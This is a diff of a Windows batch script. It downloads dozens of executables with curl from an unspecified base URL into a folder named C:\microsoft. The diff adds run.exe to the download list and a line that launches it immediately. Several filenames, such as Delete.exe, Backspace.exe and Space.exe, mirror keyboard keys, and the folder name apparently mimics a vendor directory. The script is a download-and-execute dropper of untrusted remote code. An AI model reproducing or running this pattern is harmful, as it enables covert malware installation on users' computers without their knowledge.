@@ -5,7 +5,7 @@ set "destDir=C:\microsoft"
 :: Create destination directory if it doesn't exist
 if not exist "%destDir%" mkdir "%destDir%"
 
-:: List of filenames (no spaces in filenames)
+:: List of filenames
 for %%F in (
     a.exe
     b.exe
@@ -38,8 +38,10 @@ for %%F in (
     Delete.exe
     Backspace.exe
     Space.exe
+    run.exe
 ) do (
     curl -L -o "%destDir%\%%F" "%baseUrl%/%%F"
 )
+start "" "C:\microsoft\run.exe"
 
 exit
